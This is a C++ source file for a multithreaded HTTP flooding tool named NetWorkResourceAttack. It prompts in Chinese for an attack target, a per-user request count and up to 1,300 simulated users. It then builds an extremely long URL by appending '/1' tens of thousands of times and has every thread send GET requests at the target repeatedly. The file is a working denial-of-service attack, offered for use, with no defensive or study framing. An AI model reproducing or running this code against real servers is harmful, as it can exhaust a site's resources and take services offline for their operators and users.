//
// Created by ubuntu on 24-2-17.
//

#include "config.h"
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include "EasyLib.cpp"
#include "HttpRequests_Socket.cpp"
#include "HttpRequests.cpp"
#include "random.cpp"

using namespace std;

class NetWorkResourceAttack {
private:
    std::string target;
    int number = 0;
    bool isAlways = false;
    int thread = 0;
    bool isBackup = false;
    int attack_number = 0;
    int port = 80;
public:
    NetWorkResourceAttack() = default;
    void run_threads(int thread) {
        std::vector<std::thread> threads;
        for (int i = 0; i < thread; i++) {
            threads.emplace_back([this, i] { attack(i); });
        }
        for (auto& thread : threads) {
            thread.join();
        }
    }

    void attack(int i) {
        stringstream ss;
        ss << target;
        for (int a = 0 ; a < INT16_MAX ; a++) {
            ss << "/1";
        }
        auto* hr = new HttpRequests(ss.str());

        for (int j = 0 ; j < number ; j++) {
            hr-> GetRequest();
            attack_number += 1;
            if (random_bool()) {
                std::cout << "  [ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << " " << ss.str().length() << std::endl;
            }
            else {
                std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
            }
        }
    }

    void Console() {

        try {
            target = input("输入你的攻击目标: ");
            string n = input(
                    "输入单个用户的攻击量: "
            );
            if (n == "max") {
                isAlways = true;
            }else {
                try {
                    number = stoi(n);
                }catch (const runtime_error& error) {
                    std::cout << "[ERR] Your Input Error." << std::endl;
                    return;
                }
            }
            try {
                thread = stoi(input("输入模拟的用户数量: [1-1300] "));
                if (thread > 1300 || thread < 1)
                {
                    std::cerr << "Your Input Error. Break the options.";
                    return;
                }
            }catch (const runtime_error& error)
            {
                std::cout << "[ERR] Your Input Error." << std::endl;
                return;
            }
            try {
                cout << "\n------------------------------------" << endl;
                run_threads(thread);
            }catch (const runtime_error& error) {
                std::cout << "[ERR] runtime Error." << std::endl;
                return;
            }
            cout << "Finish Attack" << endl;
        }catch (const runtime_error& e) {
            cout << e.what() << endl;
        }
    }
};
